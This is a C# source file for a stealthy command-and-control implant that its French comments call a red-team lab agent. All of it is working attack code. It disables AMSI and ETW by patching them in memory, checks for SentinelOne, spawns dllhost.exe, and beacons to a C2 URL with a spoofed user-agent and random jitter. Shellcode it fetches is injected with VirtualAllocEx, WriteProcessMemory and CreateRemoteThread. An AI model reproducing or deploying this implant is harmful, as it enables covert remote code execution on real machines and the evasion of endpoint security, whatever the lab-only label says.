// KillShifterAgent.cs
// Agent furtif avec migration de processus, scan SentinelOne, injection shellcode (lab Red Team only)

using System;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

class KillShifterAgent
{
    static readonly string c2Url = "http://127.0.0.1:5000/api/beacon";
    static readonly string agentUuid = "agent-killshift-001";

    static async Task Main()
    {
        BypassAmsiEtw();

        // 🔍 Scan de présence SentinelOne
        if (Process.GetProcessesByName("SentinelAgent").Any() ||
            Process.GetProcessesByName("SentinelOne").Any())
        {
            Console.WriteLine("[!] SentinelOne détecté");
        }

        string targetProc = "dllhost"; // Processus calme pour migration
        int pid = SpawnProcess(targetProc);
        if (pid == 0)
        {
            Console.WriteLine("[-] Échec du lancement de processus cible");
            return;
        }

        while (true)
        {
            try
            {
                using HttpClient client = new HttpClient();
                client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

                string request = agentUuid + "|BEACON_SHELLCODE";
                var beacon = new StringContent(request, Encoding.UTF8, "text/plain");
                HttpResponseMessage response = await client.PostAsync(c2Url, beacon);

                byte[] payload = await response.Content.ReadAsByteArrayAsync();
                if (payload.Length > 0)
                {
                    bool injected = InjectInto(pid, payload);
                    string result = agentUuid + (injected ? "|[+] Injection réussie" : "|[-] Injection échouée");
                    await client.PostAsync(c2Url, new StringContent(result, Encoding.UTF8, "text/plain"));
                }
            }
            catch { }

            int delay = new Random().Next(30000, 60000);
            await Task.Delay(delay);
        }
    }

    static bool InjectInto(int pid, byte[] payload)
    {
        IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
        if (hProc == IntPtr.Zero) return false;

        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero) return false;

        WriteProcessMemory(hProc, addr, payload, payload.Length, out _);
        CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out _);
        return true;
    }

    static int SpawnProcess(string name)
    {
        try
        {
            var p = Process.Start(name + ".exe");
            p.WaitForInputIdle();
            return p.Id;
        }
        catch { return 0; }
    }

    static void BypassAmsiEtw()
    {
        try
        {
            IntPtr amsi = LoadLibrary("amsi.dll");
            IntPtr scanBuf = GetProcAddress(amsi, "AmsiScanBuffer");
            VirtualProtect(scanBuf, (UIntPtr)6, 0x40, out _);
            Marshal.Copy(new byte[] { 0x48, 0x31, 0xC0, 0xC3 }, 0, scanBuf, 4);
        }
        catch { }

        try
        {
            IntPtr ntdll = LoadLibrary("ntdll.dll");
            IntPtr etw = GetProcAddress(ntdll, "EtwEventWrite");
            VirtualProtect(etw, (UIntPtr)6, 0x40, out _);
            Marshal.Copy(new byte[] { 0xC3 }, 0, etw, 1);
        }
        catch { }
    }

    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
}
